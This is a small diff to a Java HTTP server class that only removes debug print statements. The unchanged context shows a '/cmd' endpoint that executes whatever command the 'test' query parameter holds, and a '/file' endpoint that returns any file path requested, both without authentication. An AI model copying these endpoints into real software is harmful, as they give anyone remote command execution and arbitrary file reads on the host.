@@ -49,7 +49,6 @@ public class Server {
         else if (requestURI.getPath().equals("/file")) {
             Map<String, String> params = queryToMap(exchange.getRequestURI().getQuery());
             File path = new File(params.get("file"));
-            System.out.println(path.exists());
             if (path.exists()) {
                 exchange.sendResponseHeaders(200, path.length());
                 os.write(Files.readAllBytes(path.toPath()));
@@ -63,7 +62,6 @@ public class Server {
         // example -> http://localhost:9999/cmd?test=ls
         else if (requestURI.getPath().equals("/cmd")) {
             Map<String, String> params = queryToMap(exchange.getRequestURI().getQuery());
-            System.out.println("HERE!!!\n");
             String testQ = params.get("test");
             Process process = Runtime.getRuntime().exec(testQ);
             BufferedReader reader = new BufferedReader(new InputStreamReader(process.getInputStream()));
@@ -81,7 +79,7 @@ public class Server {
             exchange.sendResponseHeaders(404, response.getBytes().length);
             os.write(response.getBytes());
         }
-        System.out.println("Close out and send back");
+        // System.out.println("Close out and send back");
         os.close();
 
     }
